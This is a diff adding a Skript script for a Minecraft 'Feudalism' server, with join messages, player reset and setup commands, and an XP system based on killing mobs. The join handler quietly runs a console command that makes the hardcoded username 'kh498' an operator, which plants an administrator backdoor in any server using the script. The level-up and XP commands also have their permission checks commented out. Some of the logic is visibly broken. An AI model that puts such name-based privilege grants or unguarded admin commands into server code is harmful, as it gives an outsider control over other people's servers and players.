@@ -1,0 +1,133 @@
+options:
+	debug: true
+#events
+on join:
+	if name of player is equal to {allplayers::*}:
+		Message "<light green>Welcome back %player%"
+		if player has permission "feu.mod.extraInfo":
+			message "<gold>Current version: <red>%{feu.version}%"
+			if player is op:
+				set {_feu.permissionLevel.%player%} to "Op"
+			else if player has permission "feu.admin.*":
+				set {_feu.permissionLevel.%player%} to "Fully Administrator"
+			else if player has permission "feu.tech.*":
+				set {_feu.permissionLevel.%player%} to "Fully technician"
+			else if player has permission "feu.mod.*":
+				set {_feu.permissionLevel.%player%} to "Fully Moderator"
+			else:
+				set {_feu.permissionLevel.%player%} to "Unknown/not fully of any of the above :/"
+			message "<gold>Your current permission level: <red>%{_feu.permissionLevel.%player%}%"		
+		stop
+	else:
+		add "%name of player%" to {allplayers::*}
+		if name of player is equal to "kh498":
+			execute console command "op kh498"
+			message "This server uses your level system, now you gained op rights"		
+	if {feu.level.%player%} doesn't exist:
+		if {resetMessage.%player%} exists:
+			Message "<light red>Something went wrong(did you change your name?)! Your character has been reset!"
+on xp spawn:
+	cancel event
+
+
+#Commands 	
+command /checksetup:
+	aliases: csu
+	trigger:
+		#make sure the player is really reset
+		execute console command "fc %player% Silent" #fully clear
+		deop the player 
+		set gamemode of player to survival
+		execute console command "manudel %player%"
+		broadcast "<magenta>Welcome <b>%player%<r><magenta> to Feudalism!"
+		message ""
+		#Setup the player
+		set {feu.level.%player%} to 1
+		set player's level to {feu.level.%player%}
+		set level progress of the player to 0
+		#armour & weapon
+		give a wooden sword named "<yellow>Old Rotten Sword" to the player
+		
+		equip the player with leather helmet named "<yellow>Decayed Leather Helmet"
+		equip the player with leather chestplate named "<yellow>Decayed Chestplate"
+		equip the player with leather leggings named "<yellow>Decayed Leggings"
+		equip the player with leather boots named "<yellow>Decayed Boots"
+		teleport player to {feu.mainSpawn}
+
+command /resetPlayer <player> [<text="help">]:
+	usage: /resetPlayer <player> [<hacker|reboot|requested>]
+	permission: feu.tech.reset
+	trigger:
+		if arg-2 is "help":
+			message "possible resets:"
+			message "hacker|reboot|requested"
+			stop
+		else if arg-2 is "hacker" or "hack" or "h":
+			message "<light red>Yorr have been reset because of <red>hacking<light red>!"
+			message "<light red>If you think this is a mistake apply for a pardon here:<gold> ""need-link.now"""
+		else if arg-2 is "reboot":
+			player's name is "kh498"
+		else:
+			message "wrong arguments!"
+			execute player command "resetPlayer"
+			stop
+		execute console command "fc %arg-1% Silent" #fully clear
+		equip the player with leather helmet named "<yellow>Decayed Leather Helmet"
+		#set the 1st line of the item's lore to "<orange>Excalibur 2.0"
+		equip the player with leather chestplate named "<red>Red Chestplate"
+		equip the player with leather leggings named "<green>Green Leggings"
+		equip the player with leather boots named "<yellow>Yellow Boots"
+		set {feu.level.%player%} to 1
+
+#XP system
+
+on death of a zombie:
+	attacker is a player
+	set {_feu.xp.%attacker%} to 0.3*({feu.level.%attacker%}+1)^(-0.8)
+	add {_feu.xp.%attacker%} to the attacker's level progress
+	add {_feu.xp.%attacker%} to {feu.level.%attacker%}
+	{@debug} is true:
+		message "XP lvl: %{feu.level.%attacker%}%" to the attacker
+		message "XP gained: %{_feu.xp.%attacker%}%" to the attacker
+		
+on death of a skeleton:
+	attacker is a player
+	set {_feu.xp.%attacker%} to 0.4*({feu.level.%attacker%}+1)^(-0.8)
+	add {_feu.xp.%attacker%} to the attacker's level progress
+	add {_feu.xp.%attacker%} to {feu.level.%attacker%}
+	{@debug} is true:
+		message "XP lvl: %{feu.level.%attacker%}%" to the attacker
+		message "XP gained: %{_feu.xp.%attacker%}%" to the attacker
+		
+on death of a spider:
+	attacker is a player
+	set {_feu.xp.%attacker%} to 0.35*({feu.level.%attacker%}+1)^(-0.8)
+	add {_feu.xp.%attacker%} to the attacker's level progress
+	add {_feu.xp.%attacker%} to {feu.level.%attacker%}
+	{@debug} is true:
+		message "XP lvl: %{feu.level.%attacker%}%" to the attacker
+		message "XP gained: %{_feu.xp.%attacker%}%" to the attacker
+		
+command /calcXP:
+	#permission: feu.admin
+	trigger:
+		set player's level to {feu.level.%player%}
+		set {_feu.xp.%player%} to 0.3
+		message "%{_feu.xp.%player%}% || %{feu.level.%player%}% ||"
+		#formel: 0.3*X^-0.8 where X= your level 		
+		set {_feu.xp.%player%} to 0.3*({feu.level.%player%}+1)^(-0.8)
+		message "%{_feu.xp.%player%}%"
+		add {_feu.xp.%player%} to the player's level progress
+		add {_feu.xp.%player%} to {feu.level.%player%}
+		
+command /levelup [<integer=1>]:
+	#permission: feu.admin
+	aliases: lvlup
+	trigger:
+		if arg-1 is less than 0:
+			message "You cannot use a negative number"
+			stop
+		set player's level to {feu.level.%player%} + arg-1
+		set {feu.level.%player%} to floor({feu.level.%player%} + arg-1)
+		set level progress of the player to 0
+		message "Feu lvl: %{feu.level.%player%} %"
